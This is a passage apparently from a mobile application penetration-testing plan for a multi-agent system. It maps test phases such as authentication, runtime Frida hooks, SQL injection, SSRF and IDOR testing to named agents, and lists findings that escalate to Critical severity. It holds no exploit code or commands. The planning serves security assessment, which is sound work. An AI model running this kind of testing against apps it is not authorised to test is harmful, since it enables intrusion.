| Network Traffic | MobileAgent | APIAgent | Endpoint list |
| Authentication | AuthAgent | MobileAgent | Token data |
| Data Storage | MobileAgent | — | Storage dumps |
| IPC Testing | MobileAgent | — | Component list |
| Runtime | MobileAgent | ReverseEngineeringAgent | Frida hooks |
| API Testing | APIAgent | IDORAgent, SSRFAgent, SQLiAgent | Endpoints + tokens |
| Binary Analysis | ReverseEngineeringAgent | MobileAgent | Native libs |
| Reporting | MobileAgent | All agents | Consolidated findings |

---

## Severity Escalation Triggers

The following findings automatically escalate to **Critical** and trigger immediate notification:

- Hardcoded credentials or API keys with production access
- Authentication bypass (biometric, token validation)
- Exported content provider with SQL injection
- Cleartext transmission of credentials or tokens
- Remote code execution via deep link or intent injection
- Insecure WebView with JavaScript bridge to native functions
- Plaintext storage of passwords or financial data
